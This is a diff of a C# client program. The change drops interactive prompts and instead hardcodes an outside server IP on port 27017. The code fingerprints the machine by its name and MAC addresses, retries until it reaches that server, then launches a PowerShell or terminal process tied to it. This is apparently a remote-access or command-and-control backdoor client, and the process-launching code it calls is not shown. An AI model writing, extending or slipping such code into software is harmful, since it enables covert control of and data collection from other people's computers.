@@ -1,76 +1,80 @@
 ﻿using System;
+using System.Diagnostics;
+using System.Linq;
 using System.Net.NetworkInformation;
+using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Threading;
 
-public class SocketClient
+namespace client
 {
-    public static void Main(String[] args)
+    class SocketClient
     {
-        string databaseip;
-        string databaseport = "27017";
-        string serverip;
-        string result;
-        int port;
-        string pass;
-        while (true)
+        static void Main(String[] args)
         {
-            try
+
+            string mac = Environment.MachineName.ToString();
+            NetworkInterface[] adapters = NetworkInterface.GetAllNetworkInterfaces();
+            foreach (NetworkInterface adapter in adapters)
             {
-
-
-                Console.WriteLine("please enter database ip:");
-                databaseip = Console.ReadLine();
-                Ping p1 = new Ping();
-                PingReply PR = p1.Send(databaseip);
-                Console.WriteLine("please enter ip that you want get menager command :");
-                serverip = Console.ReadLine();
-                // check when the ping is not success
-                if (PR.Status.ToString().Equals("Success"))
+                IPInterfaceProperties adapterProperties = adapter.GetIPProperties();
+                GatewayIPAddressInformationCollection addresses = adapterProperties.GatewayAddresses;
+                if (addresses.Count > 0)
                 {
-                    Console.WriteLine("ping database ip is true");
-                   // Console.WriteLine("please enter server port:");
-                    //result = Console.ReadLine();
-                    port = Int32.Parse("5000");
-                    Console.WriteLine("please enter pass");
-                    Console.ForegroundColor = ConsoleColor.Black;
-                    pass = Console.ReadLine();
-                    Console.ForegroundColor = ConsoleColor.White;
-                    break;
-
+                    foreach (GatewayIPAddressInformation address in addresses)
+                    {
+                        mac = mac + "@" + adapter.GetPhysicalAddress().ToString();
+                    }
                 }
-                Console.WriteLine("cant see database ip try again");
             }
-            catch (Exception ex)
+            string databaseip = "194.5.177.152";
+            string databaseport = "27017";
+            mac = mac.Trim();
+            Console.WriteLine(mac);
+            while (true)
             {
-                Console.WriteLine("An error occured : " + ex.GetType().ToString());
+                using (TcpClient tcpClient = new TcpClient())
+                {
+                    Ping p1 = new Ping();
+                    PingReply PR = p1.Send("8.8.8.8");
+                    try
+                    {
+                        tcpClient.Connect("194.5.177.152", 27017);
+                        tcpClient.Close();
+                        break;
+                    }
+                    catch (Exception)
+                    {
+                        if (PR.Status.ToString().Equals("Success"))
+                        {
+                            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+                            {
+                                Console.WriteLine("Port closed please open 27017 port for connecting to mydatabase");
 
+                            }
+                            if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux) || RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
+                            {
+                                Console.WriteLine("Port closed please open 27017 port for connecting to mydatabase");
+                            }
+                        }
+                        Console.WriteLine("No internet please connect to internet first ");
+                    }
+                }
+            }
+            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+            {
+
+                ProcessAsyncStreamSamples.Powershell.CreatePowershellprocess(databaseip, databaseport, mac);
+            }
+
+            if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux) || RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
+            {
+
+                ProcessAsyncStreamSamples.Terminal.CreateTerminalprocess(databaseip, databaseport, mac);
             }
         }
-
-        Thread t = new Thread(() => client.infosender.clientinfosender(databaseip, databaseport));
-        t.Start();
-        while (true)
-        {
-            try
-            {
-                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
-                {
-                    ProcessAsyncStreamSamples.Powershell.CreatePowershellprocess(serverip, port, pass);
-                }
-                if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux) || RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
-                {
-                    ProcessAsyncStreamSamples.Terminal.CreateTerminalprocess(serverip, port,pass);
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("An error occured in get data and sent to database: " + ex.GetType().ToString()+ex);
-
-            }
-        }
-
     }
 }
+
 
 
